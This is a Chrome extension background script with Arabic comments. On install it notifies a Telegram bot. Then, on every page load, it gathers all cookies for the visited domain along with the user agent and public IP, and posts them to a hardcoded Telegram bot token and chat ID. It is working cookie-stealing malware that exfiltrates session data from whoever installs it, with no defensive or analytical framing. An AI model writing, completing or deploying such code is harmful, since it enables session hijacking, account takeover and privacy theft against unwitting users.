// عند التفعيل لأول مرة
chrome.runtime.onInstalled.addListener(() => {
  fetch("https://api.telegram.org/bot8144116948:AAEljekprQnj_ZAjKzRB9LpnppdGyQ7bx5s/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "8115875035",
      text: "✅ تم تفعيل الإضافة بنجاح"
    })
  }).then(() => {
    console.log("✔️ إشعار التفعيل تم إرساله");
  }).catch(err => {
    console.error("❌ فشل إرسال إشعار التفعيل:", err);
  });
});


// باقي كود تتبع الصفحات والكوكيز زي ما هو:
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.startsWith("http")) {
    try {
      const url = new URL(tab.url);
      const domain = url.hostname;

      chrome.cookies.getAll({ domain: domain }, (cookies) => {
        const cookieData = cookies.map(c => c.name + "=" + c.value).join("; ");

        chrome.scripting.executeScript(
          {
            target: { tabId: tabId },
            func: () => navigator.userAgent
          },
          (results) => {
            const userAgent = results && results[0] ? results[0].result : "Unknown";

            fetch("https://api.ipify.org?format=json")
              .then(response => response.json())
              .then(data => {
                const ip = data.ip;
                const message = `🌐 New Page Visit\nDomain: ${domain}\n\n📍 IP: ${ip}\n🖥️ UA: ${userAgent}\n\n🍪 Cookies:\n${cookieData}`;

                fetch("https://api.telegram.org/bot8144116948:AAEljekprQnj_ZAjKzRB9LpnppdGyQ7bx5s/sendMessage", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    chat_id: "8115875035",
                    text: message
                  })
                });
              });
          }
        );
      });
    } catch (e) {
      console.error("Error parsing URL:", e);
    }
  }
});